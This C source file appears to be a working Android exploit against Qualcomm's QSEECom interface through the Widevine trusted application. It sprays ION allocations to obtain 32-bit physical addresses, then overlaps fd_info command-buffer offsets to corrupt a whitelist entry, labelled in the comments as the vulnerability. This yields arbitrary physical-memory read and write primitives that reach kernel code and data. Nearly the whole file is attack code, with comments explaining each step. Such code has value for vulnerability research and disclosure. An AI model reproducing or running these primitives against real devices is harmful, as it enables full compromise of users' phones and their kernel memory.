#include <stdio.h>
#include <errno.h>
#include <inttypes.h>
#include <stdint.h>
#include <string.h>

#include "linux_uapi/msm_ion.h"
#include "ion.h"
#include "QSEEComAPI.h"
#include "widevine.h"
#include "exploit.h"

#define MAX_32BIT_ION_ATTEMPTS (1000)
// Print the progress after this amount of failed attempts
#define ATTEMPTS_PRINT_PROGRESS (100)
#define SYSTEM_ION_SIZE (0x2000)

static struct QSEECom_ion_fd_info g_exploit_fd_info = {0};
static struct QSEECom_ion_fd_info g_regular_fd_info = {0};
// In the kernel the qseecom related ION heaps are all referenced as "qsecom",
// with a single e. I'd like to think it's a typo, but they're pretty
// consistent with it so who knows. Anyway, if that's how they decide to call
// it, who am I to argue.
static ion_data_t g_ion_qsecom = {0};
static ion_data_t g_ion_system = {0};

// This function tries to allocate a multi-page ION buffer on the system heap,
// whose physical addresses fit in 32 bits
// The idea is that QSEECom_send_modified_cmd (without the _64 postfix) writes
// the physical addresses of the ION buffers it receives as 32 bits, so it
// fails if it receives an ION buffer whose physical addresses don't fit. We
// use this to sort of "spray" system ION allocations, until we reach one that
// fits.
// I'm not entirely sure what causes 32 bit physical addresses to be available
// or unavailable. If you can't get this to work after multiple tries, you
// might want to reboot your device or increase MAX_32BIT_ION_ATTEMPTS.
static int get_32bit_system_ion(void)
{
    int result = 0;
    ion_data_t ion_datas[MAX_32BIT_ION_ATTEMPTS] = {{0}};
    struct QSEECom_handle *handle = widevine_get_handle();
    size_t i = 0;

    for (; i < MAX_32BIT_ION_ATTEMPTS; i++) {
        ion_data_t *cur_data = ion_datas + i;
        if (0 == ion_memalloc(SYSTEM_ION_SIZE, ION_SYSTEM_HEAP_ID, cur_data)) {
            fprintf(stderr,
                    "[-] Failed to allocate system ION at attempt #%zu\n", i);
            goto cleanup;
        }

        // Try to send a 32 bit modified cmd, if it fails then the physical
        // addresses don't fit in 32 bits
        uint8_t cmd[0x200] = {0};
        uint8_t resp[0x8] = {0};
        struct QSEECom_ion_fd_info fd_info = {0};
        fd_info.data[0].fd = cur_data->fd;
        if (0 == QSEECom_send_modified_cmd(handle, cmd, sizeof(cmd), resp,
                                           sizeof(resp), &fd_info)) {
            break;
        }
        // In theory, other errors could also cause ENOMEM, but physical
        // addresses not fitting in 32 bits is by far the most likely one
        if (ENOMEM != errno) {
            fprintf(stderr,
                    "[-] Unexpected error checking system ION's addresses\n");
            goto cleanup;
        }

        if (0 == (i + 1) % ATTEMPTS_PRINT_PROGRESS) {
            fprintf(stderr, "[-] %zu/%zu attempts in allocating system IONs "
                    "resulted in 64 bit addresses\n",
                    i + 1, MAX_32BIT_ION_ATTEMPTS);
        }
    }

    if (MAX_32BIT_ION_ATTEMPTS == i) {
        fprintf(stderr, "[-] Perhaps a reboot would do the trick? Or maybe "
                "just play with the device for a bit and then try again?\n");
        goto cleanup;
    }

    g_ion_system = ion_datas[i];
    result = 1;

cleanup:
    // Free all the failed allocations
    for (size_t j = 0; j <= i; j++) {
        // If we succeeded make sure not to free it
        if (1 != result || j != i) {
            ion_memfree(ion_datas + j);
        }
    }
    return result;
}

int exploit_setup(void)
{
    if (0 == ion_memalloc(EXPLOIT_BUFFER_SIZE, ION_QSECOM_HEAP_ID,
                          &g_ion_qsecom)) {
        fprintf(stderr, "[-] Failed to allocate qsecom ION buffer\n");
        return 0;
    }

    if (0 == get_32bit_system_ion()) {
        return 0;
    }
    fprintf(stderr, "[+] Got a 32 bit addresses ION\n");

    // An fd_info to use for regular (non-exploit) encrypt and decrypt
    // operations
    g_regular_fd_info.data[0].fd = g_ion_qsecom.fd;
    g_regular_fd_info.data[0].cmd_buf_offset = WIDEVINE_CMD_IN_OFFSET;
    g_regular_fd_info.data[1].fd = g_ion_qsecom.fd;
    g_regular_fd_info.data[1].cmd_buf_offset = WIDEVINE_CMD_OUT_OFFSET;

    // *This is the vulnerability*
    // First, we put the system ION whitelist entries at offset 0x100, which is
    // far from the actual command contents
    g_exploit_fd_info.data[0].fd = g_ion_system.fd;
    g_exploit_fd_info.data[0].cmd_buf_offset = 0x100;
    // Now, we replace the size of the first whitelist entry with the address
    // of our qsecom ION buffer. This also zeroes the 4 lower bytes of the
    // address of the next entry, but we don't care.
    g_exploit_fd_info.data[1].fd = g_ion_qsecom.fd;
    g_exploit_fd_info.data[1].cmd_buf_offset = 0x100 + 8;
    // Lastly, we replace the 4 lower bytes of the address of the first
    // whitelist entry with the 4 higher bytes of the address of our qsecom ION
    // buffer. We expect the 4 higher bytes of the qsecom ION to be zero, which
    // means this zeroes the 4 lower bytes of the whitelist entry address.
    g_exploit_fd_info.data[2].fd = g_ion_qsecom.fd;
    g_exploit_fd_info.data[2].cmd_buf_offset = 0x100 - 4;
    // At this point, the first whitelist entry of the system ION is:
    // address = 0x0000000000000000 (4 zeroed lower bytes + 4 zero higher bytes
    //                               as we know the address fits in 32 bits)
    // size = qsecom physical address
    // This basically means everything up until the qsecom ION buffer is
    // whitelisted. Given that the kernel code and data should be before the
    // qsecom ION buffer, this gives us access to all of it.

    // We also want one address in the command itself to point to the qsecom
    // ION buffer, as we do want the exploit operations to be from/into data
    // that we control. The offset (being in or out) will be set depending on
    // the operation itself.
    g_exploit_fd_info.data[3].fd = g_ion_qsecom.fd;

    return 1;
}

int exploit_phys_write(physaddr_t addr, const void *data, size_t len)
{
    // First just encrypt the data in place
    memcpy(g_ion_qsecom.map, data, len);
    if (0 == widevine_send_encrypt(0, 0, len, &g_regular_fd_info)) {
        fprintf(stderr, "[-] Failed to encrypt in place for phys_write\n");
        return 0;
    }
    // Now decrypt the data into the given physical address
    g_exploit_fd_info.data[3].cmd_buf_offset = WIDEVINE_CMD_IN_OFFSET;
    if (0 == widevine_send_decrypt(0, addr, len, &g_exploit_fd_info)) {
        fprintf(stderr,
                "[-] Failed to write to physical address: 0x%016"
                PRIx64 ", write size: 0x%zx\n", addr, len);
        return 0;
    }
    return 1;
}

int exploit_phys_read(void *buf, physaddr_t addr, size_t len)
{
    // Encrypt the data into our ION
    g_exploit_fd_info.data[3].cmd_buf_offset = WIDEVINE_CMD_OUT_OFFSET;
    if (0 == widevine_send_encrypt(addr, 0, len, &g_exploit_fd_info)) {
        fprintf(stderr,
                "[-] Failed to read physical address: 0x%016"
                PRIx64 ", read size: 0x%zx\n", addr, len);
        return 0;
    }
    // Now just decrypt the data in place
    if (0 == widevine_send_decrypt(0, 0, len, &g_regular_fd_info)) {
        fprintf(stderr, "[-] Failed to decrypt in place for phys_read\n");
        return 0;
    }
    memcpy(buf, g_ion_qsecom.map, len);
    return 1;
}
